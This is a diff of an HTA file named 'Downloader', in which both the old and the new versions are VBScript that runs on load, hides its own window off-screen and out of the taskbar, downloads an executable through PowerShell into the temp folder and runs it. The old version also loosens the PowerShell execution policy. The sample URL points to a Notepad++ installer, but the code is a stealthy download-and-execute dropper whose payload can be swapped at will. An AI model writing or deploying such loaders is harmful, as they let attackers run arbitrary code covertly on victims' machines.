@@ -1,52 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test Script</title>
+  <title>Download and Execute</title>
+  <HTA:APPLICATION
+    ID="app"
+    APPLICATIONNAME="Downloader"
+    BORDER="none"
+    BORDERSTYLE="normal"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    WINDOWSTATE="minimize"
+    SCROLL="no"
+  />
+  <script language="VBScript">
+    Sub Window_OnLoad
+      ' Hide the window by moving it off-screen
+      window.moveTo -10000, -10000
+
+      ' Create a shell object to run commands
+      Set objShell = CreateObject("WScript.Shell")
+      Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+      ' Define the temporary folder and download URL
+      tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
+      downloadUrl = "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.7.6/npp.8.7.6.Installer.x64.exe"
+      fileName = "npp.8.7.6.Installer.x64.exe"
+      downloadedFile = tempFolder & "\" & fileName
+
+      ' Create a PowerShell command to download the file
+      cmdCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
+
+      ' Run the command in the background and wait for it to complete
+      objShell.Run cmdCommand, 0, True
+
+      ' Check if the file exists before executing it
+      If objFSO.FileExists(downloadedFile) Then
+        ' Execute the downloaded file
+        objShell.Run """" & downloadedFile & """", 1, False
+      Else
+        MsgBox "Download failed. The file does not exist.", vbCritical, "Error"
+      End If
+
+      ' Close the HTA window
+      window.close()
+    End Sub
+  </script>
 </head>
 <body>
-    <script language="VBScript">
-        Sub Window_onLoad()
-            On Error Resume Next ' Enable error handling
-
-            Window.ResizeTo 1, 1
-            Window.MoveTo -32000, -32000
-
-            Set objShell = CreateObject("WScript.Shell")
-            Set fso = CreateObject("Scripting.FileSystemObject") ' For file existence check
-
-            tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
-            downloadUrl = "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.7.6/npp.8.7.6.Installer.x64.exe"
-            downloadedFile = tempFolder & "\npp.8.7.6.Installer.x64.exe"
-
-            ' Temporarily change the PowerShell execution policy to allow the download
-            policyCommand = "powershell.exe -Command ""Set-ExecutionPolicy RemoteSigned -Scope Process -Force"""
-            objShell.Run "cmd.exe /c " & policyCommand, 0, True
-
-            ' Download the file using PowerShell with error handling
-            cmdCommand = "powershell.exe -Command ""& { " & _
-                         "try { " & _
-                         "Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "' -UseBasicParsing -ErrorAction Stop; " & _
-                         "Write-Output 'Download successful'; " & _
-                         "} catch { " & _
-                         "Write-Output 'Download failed: ' + $_.Exception.Message; " & _
-                         "exit 1; " & _
-                         "} }"""
-            objShell.Run "cmd.exe /c " & cmdCommand, 0, True
-
-            ' Check if the file was downloaded successfully
-            If fso.FileExists(downloadedFile) Then
-                ' File exists, execute it
-                objShell.Run downloadedFile, 0, False
-            Else
-                ' File does not exist, show an error message
-                MsgBox "Error: The file was not downloaded. Please check the URL or your internet connection.", vbCritical, "Download Failed"
-            End If
-
-            On Error GoTo 0 ' Disable error handling
-        End Sub
-
-        ' Trigger the Window_onLoad subroutine when the window loads
-        Window_onLoad()
-    </script>
 </body>
 </html>
